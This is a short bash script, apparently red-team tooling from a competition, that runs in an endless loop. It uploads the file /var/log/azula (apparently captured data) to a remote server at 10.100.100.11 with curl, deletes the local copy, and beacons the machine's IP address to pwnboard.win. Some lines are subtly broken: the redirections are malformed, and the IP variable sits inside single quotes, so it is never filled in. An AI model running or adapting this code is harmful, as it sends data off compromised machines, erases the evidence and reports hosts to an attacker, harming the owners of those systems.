#!/usr/local/bin/bash

while :
do
    curl -X PUT --upload-file /var/log/azula http://10.100.100.11:8000 2>&1 /dev/null
    rm /var/log/azula 2>&1 /dev/null
    sleep 5

    ip=$(ifconfig vtnet0 | grep 'inet' | awk '$1 == "inet" { print $2 }')
    # Execute command
    curl -X POST -H "Content-Type: application/json" -d '{"ip":"$ip", "type":"sexypotat0"}' -s http://pwnboard.win/generic > /dev/null
done
